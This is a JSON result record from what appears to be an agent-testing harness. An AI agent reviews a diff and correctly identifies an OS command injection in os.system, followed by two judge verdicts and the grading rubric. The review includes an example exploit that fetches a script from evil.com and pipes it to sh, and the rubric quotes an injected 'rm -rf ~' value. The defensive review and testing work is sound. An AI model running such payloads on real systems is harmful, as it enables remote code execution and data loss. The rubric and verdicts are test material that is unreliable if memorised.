@@ -1,0 +1,71 @@
+{
+  "caseId": "obfuscated-cmdi",
+  "rep": 2,
+  "prompt": "Review this diff for security issues and report your findings.",
+  "files": [
+    "diff-obfuscated-cmdi.patch"
+  ],
+  "output": "## Security Review: `diff-obfuscated-cmdi.patch`\n\n**Critical: OS Command Injection (CWE-78)**\n\nThe diff replaces a safe `subprocess.run([...])` call (argument list, no shell) with `os.system(\" \".join(parts))`, which invokes `/bin/sh -c` on a string built directly from unsanitized, user-controlled request parameters (`src`, `size`).\n\n```python\ninfile = request.GET.get(\"src\", \"input.png\")\nsize = request.GET.get(\"size\", \"100x100\")\nparts = [\"convert\", infile, \"-resize\", size, outfile]\nos.system(\" \".join(parts))\n```\n\nAny shell metacharacter in `src` or `size` (`; | & \\` $() >`) is interpreted by the shell. Example exploit:\n\n```\n?src=input.png;curl+http://evil.com/x.sh|sh;#\n```\n\nThis gives an unauthenticated caller arbitrary command execution with the web process's privileges — a straight regression from the prior, safe list-based `subprocess.run` invocation.\n\n**Secondary: misleading dead import**\n\n`import shlex` is added but never used (no `shlex.quote`/`shlex.join`). It creates the false appearance that inputs are being escaped, when in fact plain string concatenation is used and the injection is completely unmitigated.\n\n**Fix:** revert to the list-form `subprocess.run([\"convert\", infile, \"-resize\", size, outfile], check=True)` (no shell involved), and additionally validate `infile`/`size` against strict allow-lists (e.g. `size` must match `^\\d+x\\d+$`, `infile` must resolve to an expected directory) since ImageMagick's `convert` itself has had file-access/policy issues when fed attacker-controlled filenames.",
+  "exitCode": 0,
+  "timedOut": false,
+  "infraRetries": 0,
+  "startedAt": "2026-07-19T00:22:30.122Z",
+  "durationMs": 33291,
+  "checks": [
+    {
+      "matcher": "llm_rubric",
+      "passed": true,
+      "details": {
+        "verdict": "pass",
+        "judgments": [
+          {
+            "verdict": "pass",
+            "reasoning": "The agent correctly identified that the diff replaces a safe list-based subprocess.run call with os.system(\" \".join(parts)), explicitly noting that unsanitized user-controlled request.GET parameters (src, size) flow into a shell string and are interpreted by /bin/sh -c, giving arbitrary command execution. It gave a concrete exploit example and correct fix, and additionally (correctly) noted the unused shlex import as a secondary, misleading issue rather than mistaking it for real sanitization. This matches the rubric's requirement to identify the command injection as a real vulnerability caused by user input reaching os.system.",
+            "raw": "VERDICT: PASS\nREASON: The agent correctly identified that the diff replaces a safe list-based subprocess.run call with os.system(\" \".join(parts)), explicitly noting that unsanitized user-controlled request.GET parameters (src, size) flow into a shell string and are interpreted by /bin/sh -c, giving arbitrary command execution. It gave a concrete exploit example and correct fix, and additionally (correctly) noted the unused shlex import as a secondary, misleading issue rather than mistaking it for real sanitization. This matches the rubric's requirement to identify the command injection as a real vulnerability caused by user input reaching os.system."
+          },
+          {
+            "verdict": "pass",
+            "reasoning": "The agent correctly identified that user-controlled `src` and `size` parameters flow into a shell string via `os.system(\" \".join(parts))`, replacing a previously safe `subprocess.run([...])` argument-vector call, and gave a concrete shell-metacharacter exploit demonstrating arbitrary command execution — precisely the vulnerability the rubric requires. It also correctly flagged the unused `shlex` import as secondary/misleading rather than mistaking it for actual mitigation, and did not conclude the code was safe.",
+            "raw": "VERDICT: PASS\nREASON: The agent correctly identified that user-controlled `src` and `size` parameters flow into a shell string via `os.system(\" \".join(parts))`, replacing a previously safe `subprocess.run([...])` argument-vector call, and gave a concrete shell-metacharacter exploit demonstrating arbitrary command execution — precisely the vulnerability the rubric requires. It also correctly flagged the unused `shlex` import as secondary/misleading rather than mistaking it for actual mitigation, and did not conclude the code was safe."
+          }
+        ],
+        "model": "claude-sonnet-5",
+        "transport": "claude-agent",
+        "prompt": "You are an impartial evaluator inside an automated agent-testing tool. Judge ONLY whether the agent's output satisfies the rubric — not style, not effort, not whether you would have answered differently.\n\n<rubric>\nThe diff introduces an OS command injection vulnerability: user-controlled `size`/`src` from request.GET are collected into a `parts` list that is then joined into a single shell string with `' '.join(parts)` and passed to `os.system(...)`, allowing arbitrary shell command execution (e.g. size='100x100; rm -rf ~'). The previous code used a safe `subprocess.run([...])` argument vector. PASS only if the review identifies this as a real command/shell injection vulnerability caused by user input reaching `os.system`; FAIL if it misses it, concludes the code is safe (e.g. mistakes `parts` for a safe argument vector), or only comments on style or the unused `shlex` import.\n</rubric>\n\n<task_given_to_agent>\nReview this diff for security issues and report your findings.\n</task_given_to_agent>\n\n<agent_output>\n## Security Review: `diff-obfuscated-cmdi.patch`\n\n**Critical: OS Command Injection (CWE-78)**\n\nThe diff replaces a safe `subprocess.run([...])` call (argument list, no shell) with `os.system(\" \".join(parts))`, which invokes `/bin/sh -c` on a string built directly from unsanitized, user-controlled request parameters (`src`, `size`).\n\n```python\ninfile = request.GET.get(\"src\", \"input.png\")\nsize = request.GET.get(\"size\", \"100x100\")\nparts = [\"convert\", infile, \"-resize\", size, outfile]\nos.system(\" \".join(parts))\n```\n\nAny shell metacharacter in `src` or `size` (`; | & \\` $() >`) is interpreted by the shell. Example exploit:\n\n```\n?src=input.png;curl+http://evil.com/x.sh|sh;#\n```\n\nThis gives an unauthenticated caller arbitrary command execution with the web process's privileges — a straight regression from the prior, safe list-based `subprocess.run` invocation.\n\n**Secondary: misleading dead import**\n\n`import shlex` is added but never used (no `shlex.quote`/`shlex.join`). It creates the false appearance that inputs are being escaped, when in fact plain string concatenation is used and the injection is completely unmitigated.\n\n**Fix:** revert to the list-form `subprocess.run([\"convert\", infile, \"-resize\", size, outfile], check=True)` (no shell involved), and additionally validate `infile`/`size` against strict allow-lists (e.g. `size` must match `^\\d+x\\d+$`, `infile` must resolve to an expected directory) since ImageMagick's `convert` itself has had file-access/policy issues when fed attacker-controlled filenames.\n</agent_output>\n\nAnswer in EXACTLY this format (first line must be the verdict):\nVERDICT: PASS\nREASON: <one short paragraph>\n\nor\n\nVERDICT: FAIL\nREASON: <one short paragraph>"
+      }
+    }
+  ],
+  "usage": {
+    "input_tokens": 8,
+    "output_tokens": 1606,
+    "model": "claude-sonnet-5"
+  },
+  "transcript": {
+    "subtype": "success",
+    "num_turns": 4,
+    "total_cost_usd": 0.1300151,
+    "modelUsage": {
+      "claude-haiku-4-5-20251001": {
+        "inputTokens": 546,
+        "outputTokens": 13,
+        "cacheReadInputTokens": 0,
+        "cacheCreationInputTokens": 0,
+        "webSearchRequests": 0,
+        "costUSD": 0.000611,
+        "contextWindow": 200000,
+        "maxOutputTokens": 32000
+      },
+      "claude-sonnet-5": {
+        "inputTokens": 8,
+        "outputTokens": 1606,
+        "cacheReadInputTokens": 103427,
+        "cacheCreationInputTokens": 12377,
+        "webSearchRequests": 0,
+        "costUSD": 0.1294041,
+        "contextWindow": 1000000,
+        "maxOutputTokens": 64000
+      }
+    },
+    "_note": "SDK message stream removed for privacy; summary retained"
+  }
+}
